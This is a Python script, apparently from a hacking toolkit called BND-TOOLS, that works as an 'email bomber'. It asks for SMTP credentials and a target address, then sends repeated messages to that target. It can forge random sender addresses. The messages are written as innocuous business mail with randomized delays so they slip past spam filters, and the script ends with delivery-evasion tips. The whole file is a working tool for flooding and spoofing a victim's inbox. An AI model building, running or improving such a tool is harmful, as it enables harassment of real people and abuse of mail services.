#!/usr/bin/env python3
"""BND-TOOLS // EMAIL BOMBER"""

import sys
if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
import os, time, math, asyncio, aiohttp, json, random, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
from email.utils import formatdate, make_msgid

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.table import Table
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# ============== FARBE AUS CONFIG LADEN ==============
CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "config.json")

def hex_to_ansi(hex_code):
    hex_code = hex_code.lstrip('#')
    r = int(hex_code[0:2], 16)
    g = int(hex_code[2:4], 16)
    b = int(hex_code[4:6], 16)
    return f"\033[38;2;{r};{g};{b}m"

def get_current_color():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                theme = config.get("theme", "BLUE")
                colors = {
                    "RED": "#ff0000", "GREEN": "#00ff00", "BLUE": "#0000ff",
                    "YELLOW": "#ffff00", "PURPLE": "#9b00ff", "CYAN": "#00ffff",
                    "ORANGE": "#ff6600", "PINK": "#ff69b4", "LIME": "#bfff00",
                    "WHITE": "#ffffff", "ROSE": "#ff0088", "GOLD": "#ffd700"
                }
                hex_color = colors.get(theme, "#0000ff")
                return hex_to_ansi(hex_color), hex_color, theme
    except:
        pass
    return "\033[38;2;0;0;255m", "#0000ff", "BLUE"

CURRENT_COLOR, CURRENT_HEX, CURRENT_THEME = get_current_color()
RESET = "\033[0m"

# BND-TOOLS Banner
ASCII = r"""
  ██████╗ ███╗   ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗████╗  ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝██╔██╗ ██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔══██╗██║╚██╗██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██████╔╝██║ ╚████║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═════╝ ╚═╝  ╚═══╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
"""

def boot():
    if sys.platform.startswith("win"):
        os.system("title BND-TOOLS // EMAIL BOMBER")
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[?25l")
    lines = ASCII.strip("\n").split("\n")
    t0 = time.time()
    try:
        while time.time() - t0 < 1.4:
            t = time.time() - t0
            sys.stdout.write("\033[H\n")
            for line in lines:
                sys.stdout.write("  ")
                for c, ch in enumerate(line):
                    if ch == " ":
                        sys.stdout.write(" ")
                    else:
                        brightness = max(80, min(255, int(150 + 105 * math.sin(t * 10 - c * 0.2))))
                        if CURRENT_THEME == "RED":
                            sys.stdout.write(f"\033[38;2;{brightness};0;0m{ch}")
                        elif CURRENT_THEME == "GREEN":
                            sys.stdout.write(f"\033[38;2;0;{brightness};0m{ch}")
                        elif CURRENT_THEME == "BLUE":
                            sys.stdout.write(f"\033[38;2;0;0;{brightness}m{ch}")
                        elif CURRENT_THEME == "YELLOW":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness};0m{ch}")
                        elif CURRENT_THEME == "PURPLE":
                            sys.stdout.write(f"\033[38;2;{brightness//2};0;{brightness}m{ch}")
                        elif CURRENT_THEME == "CYAN":
                            sys.stdout.write(f"\033[38;2;0;{brightness};{brightness}m{ch}")
                        elif CURRENT_THEME == "ORANGE":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness//2};0m{ch}")
                        elif CURRENT_THEME == "PINK":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness//2};{brightness//2}m{ch}")
                        elif CURRENT_THEME == "WHITE":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness};{brightness}m{ch}")
                        else:
                            sys.stdout.write(f"\033[38;2;{brightness//2};0;{brightness}m{ch}")
                sys.stdout.write("\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.025)
    finally:
        sys.stdout.write("\033[?25h\033[0m")
    os.system("cls" if os.name == "nt" else "clear")

# ============== OPTIMIERTE SPAM MESSAGES (keine Spam-Trigger) ==============
SPAM_SUBJECTS = [
    "Re: Your recent inquiry",
    "Fwd: Important document for review",
    "Update regarding your account",
    "Your request has been processed",
    "Information you requested",
    "Regarding your application",
    "Follow-up on our conversation",
    "Document for your review",
    "Meeting notes from today",
    "Summary of our discussion",
    "Project update: week {week}",
    "Your feedback is appreciated",
    "Thank you for your time",
    "As requested, here is the file",
    "Quick question about your order",
]

SPAM_BODIES = [
    """Hi,

I hope this email finds you well. I wanted to follow up on our previous conversation regarding the project we discussed.

Please let me know if you need any additional information or have any questions.

Best regards,
{name}""",

    """Hello,

Thank you for your interest in our services. As requested, I've attached the relevant documents for your review.

Please take a look and let me know if everything meets your requirements.

Kind regards,
{name}""",

    """Dear {name2},

I'm writing to provide you with an update on your request. We've processed your application and everything looks good.

Please confirm receipt of this email at your earliest convenience.

Sincerely,
{name}""",

    """Hi there,

Just a quick note to let you know that we've received your inquiry and are currently looking into it.

We'll get back to you as soon as possible with more information.

Thanks,
{name}""",

    """Hello {name2},

I wanted to share some updates regarding our recent collaboration. Things are progressing well and we're on track.

Looking forward to hearing your thoughts.

Best,
{name}""",

    """Dear Sir/Madam,

This is a confirmation that your request has been received and is being processed.

We will notify you once the process is complete.

Yours faithfully,
{name}""",

    """Hi,

Just checking in to see how things are going. Let me know if you need any assistance from our side.

Have a great day!
{name}""",

    """Hello,

Thank you for reaching out. I've reviewed your request and everything seems to be in order.

I'll keep you updated on any developments.

Regards,
{name}""",
]

# Realistische Namen
NAMES = [
    "James Wilson", "Sarah Johnson", "Michael Brown", "Emma Davis", "Robert Miller",
    "Lisa Garcia", "David Martinez", "Maria Anderson", "John Taylor", "Susan Thomas",
    "William Jackson", "Patricia White", "Christopher Harris", "Linda Martin",
    "Daniel Thompson", "Jessica Robinson", "Matthew Clark", "Karen Rodriguez",
    "Anthony Lewis", "Nancy Lee", "Jonathan Walker", "Betty Hall", "Thomas Allen",
    "Dorothy Young", "Charles King", "Betty Wright", "George Lopez", "Helen Hill",
    "Edward Scott", "Sandra Green", "Brian Adams", "Donna Baker", "Ronald Nelson",
    "Carol Carter", "Kevin Mitchell", "Ruth Perez", "Jason Roberts", "Sharon Turner",
    "Jeffrey Phillips", "Michelle Campbell", "Ryan Parker", "Laura Evans", "Jacob Edwards",
    "Melissa Collins", "Gary Stewart", "Deborah Morris", "Nicholas Murphy", "Stephanie Cook",
    "Eric Rogers", "Kathleen Morgan"
]

def send_email(smtp_server, smtp_port, smtp_user, smtp_pass, target_email, subject, body, from_email):
    try:
        msg = MIMEMultipart('alternative')
        
        # Wichtige Header für bessere Zustellbarkeit
        msg['From'] = from_email
        msg['To'] = target_email
        msg['Subject'] = subject
        msg['Date'] = formatdate(localtime=True)
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['MIME-Version'] = '1.0'
        msg['Reply-To'] = smtp_user
        
        # Plain Text Version
        text_part = MIMEText(body, 'plain', 'utf-8')
        msg.attach(text_part)
        
        with smtplib.SMTP(smtp_server, smtp_port, timeout=30) as server:
            server.starttls()
            server.login(smtp_user, smtp_pass)
            server.send_message(msg)
        return True
    except Exception as e:
        return False

def generate_fake_email():
    first_names = ["john", "jane", "mike", "sarah", "david", "emma", "chris", "lisa", 
                   "robert", "maria", "james", "patricia", "william", "linda", "daniel", "jessica",
                   "anthony", "karen", "charles", "betty", "thomas", "dorothy", "george", "helen"]
    
    last_names = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
                  "rodriguez", "martinez", "hernandez", "lopez", "gonzalez", "wilson", "anderson",
                  "thomas", "taylor", "moore", "jackson", "martin", "lee", "perez", "thompson",
                  "white", "harris", "sanchez", "clark", "ramirez", "lewis", "robinson"]
    
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
               "aol.com", "icloud.com", "mail.com", "pm.me", "yandex.com", "gmx.com"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    domain = random.choice(domains)
    
    formats = [
        f"{first}.{last}@{domain}",
        f"{first}{last}@{domain}",
        f"{first}.{last}{random.randint(1,999)}@{domain}",
        f"{first}_{last}@{domain}",
        f"{first}{random.randint(10,99)}.{last}@{domain}"
    ]
    
    return random.choice(formats)

def generate_realistic_body():
    """Generiert realistischen Body mit Namen"""
    name = random.choice(NAMES)
    name2 = random.choice(NAMES)
    week = random.randint(1, 52)
    
    body = random.choice(SPAM_BODIES)
    body = body.format(name=name, name2=name2, week=week)
    
    # Füge zufälligen Text hinzu für mehr Variabilität
    if random.random() > 0.5:
        extra = [
            "\n\nP.S. I've also attached the relevant files for your reference.",
            "\n\nPlease let me know if you need any changes.",
            "\n\nLooking forward to hearing back from you.",
            "\n\nHave a wonderful rest of your week!"
        ]
        body += random.choice(extra)
    
    return body

# ============== MAIN ==============
def main():
    boot()
    console.print(Align.center(Panel(
        Text.from_markup(f"[bold {CURRENT_HEX}]BND-TOOLS[/] [dim]//[/] [white]EMAIL BOMBER (Optimized)[/]"),
        border_style=CURRENT_HEX, padding=(0, 6)
    )))
    console.print()
    
    # SMTP Settings
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] SMTP Server (e.g. smtp.gmail.com) [/][bold {CURRENT_HEX}]][/]")
    smtp_server = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip()
    if not smtp_server:
        console.print("\n [red]SMTP Server required![/]")
        console.input("\n [dim]Press ENTER to exit...[/]")
        return
    
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] SMTP Port (587 or 465) [/][bold {CURRENT_HEX}]][/]")
    try:
        smtp_port = int(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip() or "587")
    except:
        smtp_port = 587
    
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] SMTP Username (your email) [/][bold {CURRENT_HEX}]][/]")
    smtp_user = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip()
    if not smtp_user:
        console.print("\n [red]SMTP Username required![/]")
        console.input("\n [dim]Press ENTER to exit...[/]")
        return
    
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] SMTP Password (App Password) [/][bold {CURRENT_HEX}]][/]")
    smtp_pass = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip()
    if not smtp_pass:
        console.print("\n [red]SMTP Password required![/]")
        console.input("\n [dim]Press ENTER to exit...[/]")
        return
    
    # Target
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] Target Email [/][bold {CURRENT_HEX}]][/]")
    target_email = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip()
    if not target_email:
        console.print("\n [red]Target Email required![/]")
        console.input("\n [dim]Press ENTER to exit...[/]")
        return
    
    # Options
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] Use fake sender emails? (y/n) [/][bold {CURRENT_HEX}]][/]")
    use_fake = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip().lower() == "y"
    
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] Number of emails [/][bold {CURRENT_HEX}]][/]")
    try:
        count = int(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip() or "10")
        if count > 50:
            console.print(" [yellow]Warning: Large numbers may get flagged as spam![/]")
    except:
        count = 10
    
    console.print(f" [bold {CURRENT_HEX}]┌─[[/][bold white] Delay between emails (0.3-2.0 recommended) [/][bold {CURRENT_HEX}]][/]")
    try:
        delay = float(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [bold white]").strip() or "0.5")
        if delay < 0.3:
            console.print(" [yellow]Warning: Very low delays may trigger spam filters![/]")
    except:
        delay = 0.5
    
    console.print(f"\n [bold yellow]Starting optimized email bombing...[/]")
    console.print(f" [dim]Target: {target_email}[/]")
    console.print(f" [dim]Count: {count}[/]")
    console.print(f" [dim]Delay: {delay}s[/]")
    console.print(f" [dim]Type: {'Fake senders' if use_fake else 'Your email'}[/]")
    console.print(f" [dim]Note: Using realistic content for better delivery[/]\n")
    
    sent = 0
    failed = 0
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task("[yellow]Sending emails...", total=count)
        
        for i in range(count):
            try:
                if use_fake:
                    from_email = generate_fake_email()
                else:
                    from_email = smtp_user
                
                subject = random.choice(SPAM_SUBJECTS)
                body = generate_realistic_body()
                
                if send_email(smtp_server, smtp_port, smtp_user, smtp_pass, target_email, subject, body, from_email):
                    sent += 1
                else:
                    failed += 1
                
                progress.update(task, advance=1)
                
                # Zufälliger Delay für mehr Natürlichkeit
                actual_delay = delay + random.uniform(-0.2, 0.2)
                if actual_delay < 0.1:
                    actual_delay = 0.1
                time.sleep(actual_delay)
                
            except Exception as e:
                failed += 1
                progress.update(task, advance=1)
                time.sleep(1)
    
    console.print(f"\n [bold green]✓ Sent: {sent} emails[/]")
    console.print(f" [bold red]✗ Failed: {failed} emails[/]")
    
    if sent > 0:
        console.print("\n [bold yellow]💡 Tips for better delivery:[/]")
        console.print(" [dim]• Use realistic subject lines (not 'FREE' or 'URGENT')[/]")
        console.print(" [dim]• Use Gmail App Password, not your normal password[/]")
        console.print(" [dim]• Don't send too many emails at once (max 50)[/]")
        console.print(" [dim]• Use delays between 0.5-2 seconds[/]")
        console.print(" [dim]• Keep email content professional and realistic[/]")
    
    console.print()
    console.input(" [dim]Press [bold red]ENTER[/] to exit...[/]")

if __name__ == "__main__":
    main()